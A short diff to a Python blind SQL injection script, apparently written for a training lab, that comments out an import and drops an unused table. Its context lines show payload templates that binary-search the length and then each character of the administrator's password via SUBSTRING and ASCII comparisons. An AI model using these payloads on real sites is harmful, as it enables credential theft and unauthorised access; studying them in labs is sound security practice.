@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 import requests
-from requests.models import Response
+#from requests.models import Response
 import urllib3
 from sys import argv
 from urllib import parse
@@ -40,7 +40,6 @@ class Request():
 	BinarySearchLengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){operator}{PasswordValue})='a"
 	BinarySearchCrakPayload = "'AND (SELECT ASCII(SUBSTRING(password,{indexOfletter},1)) FROM users WHERE username='administrator'){operator}'{PasswordValue}"
 
-	asciiTable = [ i for i in range(128)] # ascii table
 	Wordlist = string.ascii_letters + string.digits
 	
 	def __init__(self, TargetUrl, proxies=None, cookies=None, lengthPayload=LengthPayload, crackPayload=crakPayload  ):
